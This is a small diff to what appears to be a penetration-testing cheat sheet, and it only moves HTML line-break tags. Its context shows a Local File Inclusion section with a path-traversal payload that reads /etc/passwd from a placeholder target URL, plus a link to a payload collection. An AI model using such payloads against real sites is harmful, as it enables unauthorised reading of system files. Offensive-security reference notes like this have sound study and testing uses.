@@ -178,11 +178,10 @@ Powershell location<br />
 -64-bit (x64) Powershell executable C:\Windows\system32\WindowsPowerShell\v1.0\powershell.exe  
 ```
 
-<br />
 ## Local File Inclusion (LFI) 
 Put files locally on the target and trigger webshell by browsing the page. <br />
 ```sh 
 http://target.com/?page=home
 http://target.com/?page=./../../../../../../../../../etc/passwd%00
 ```
-eg. https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion
+eg. https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion <br />
